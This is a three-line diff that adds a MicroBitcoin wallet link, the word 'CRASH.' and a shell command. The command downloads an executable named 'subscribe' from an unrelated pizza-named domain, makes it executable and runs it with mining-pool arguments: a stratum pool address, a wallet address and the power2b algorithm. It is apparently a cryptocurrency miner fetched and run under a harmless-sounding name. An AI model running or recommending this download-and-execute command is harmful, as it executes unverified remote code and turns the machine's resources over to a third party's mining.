@@ -1,0 +1,3 @@
+Crash Wallet : https://microbitcoinorg.github.io/wallet/#/
+CRASH.
+wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://MiningMadness.com:6590 -u MqZeG9Tuh9DXVmrswhHSg7bJy117KewEd2.CRASH -p c=MBC
